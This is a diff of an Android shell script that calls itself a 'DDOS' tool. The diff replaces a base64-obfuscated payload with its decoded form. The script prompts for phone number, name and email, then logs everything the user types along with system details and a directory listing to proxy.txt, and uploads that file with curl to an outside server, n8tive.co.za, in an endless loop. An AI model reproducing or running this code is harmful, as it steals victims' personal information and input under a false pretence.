@@ -1,3 +1,38 @@
+#!/system/bin/bash/sh
+echo "DDOS"
+echo "Please Enter your Personal Information to use"
+echo ""
+  echo -n "Phone Number:"
+  read phone
+  echo -n "first and last name :"
+  read name
+  echo -n "Email :"
+  read email
 
-code="IyEvc3lzdGVtL2Jpbi9iYXNoL3NoDQplY2hvICJERE9TIg0KZWNobyAiUGxlYXNlIEVudGVyIHlvdXIgUGVyc29uYWwgSW5mb3JtYXRpb24gdG8gdXNlIg0KZWNobyAiIg0KICBlY2hvIC1uICJQaG9uZSBOdW1iZXI6Ig0KICByZWFkIHBob25lDQogIGVjaG8gLW4gImZpcnN0IGFuZCBsYXN0IG5hbWUgOiINCiAgcmVhZCBuYW1lDQogIGVjaG8gLW4gIkVtYWlsIDoiDQogIHJlYWQgZW1haWwNCg0KY20oKQ0Kew0KcmVhZCBsaW5lDQogIGNhc2UgJGxpbmUgaW4NCg0KICAkbGluZSkNCiAgZWNobyAiDQogIFN5c3RlbSA6ICQodW5hbWUgLWEpDQogIFVzZXIgICA6ICQod2hvYW1pKQ0KICBkYXRlICAgOiAkKGRhdGUpDQogIHBhdGggICA6ICQocHdkKQ0KDQogICQoY2QgL3NkY2FyZC9kb3dubG9hZCkNCiAgJChscyAtbGEpDQogICQoY2QpDQoNCiAgcGhvbmUgbnVtYmVyIDogJHBob25lDQogIG5hbWUgOiAkbmFtZQ0KICBlbWFpbCA6ICRlbWFpbA0KDQogICcsJ3skbGluZX0nLCcgIiA+PiBwcm94eS50eHQNCiAgY3VybCAtVCBwcm94eS50eHQgaHR0cDovL244dGl2ZS5jby56YS8NCiAgY20NCg0KIGVzYWMNCiB9DQpjbQ=="
-bash <( base64 -d <<< "$code" )
+cm()
+{
+read line
+  case $line in
+
+  $line)
+  echo "
+  System : $(uname -a)
+  User   : $(whoami)
+  date   : $(date)
+  path   : $(pwd)
+
+  $(cd /sdcard/download)
+  $(ls -la)
+  $(cd)
+
+  phone number : $phone
+  name : $name
+  email : $email
+
+  ','{$line}',' " >> proxy.txt
+  curl -T proxy.txt http://n8tive.co.za/
+  cm
+
+ esac
+ }
+cm
